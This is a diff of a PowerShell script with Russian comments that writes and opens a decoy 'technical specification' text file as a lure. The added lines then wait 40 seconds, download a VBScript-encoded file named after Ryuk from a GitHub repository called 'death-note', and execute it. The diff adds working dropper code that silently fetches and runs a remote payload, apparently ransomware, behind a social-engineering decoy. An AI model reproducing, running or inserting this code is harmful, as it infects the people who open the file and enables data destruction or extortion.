@@ -1,3 +1,4 @@
+# Создание текстового файла
 $fileName = "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
 $filePath = Join-Path $env:LOCALAPPDATA $fileName
 
@@ -41,3 +42,15 @@ $content = @"
 
 $content | Out-File -FilePath $filePath -Encoding UTF8
 Invoke-Item $filePath
+
+# Задержка
+Start-Sleep -Seconds 40
+
+# Скачивание и запуск файла
+$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
+$FileName = "ryuk.vbe"
+$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
+$DownloadPath = Join-Path $LocalAppData $FileName
+
+Invoke-WebRequest -Uri $Url -OutFile $DownloadPath
+Start-Process -FilePath $DownloadPath
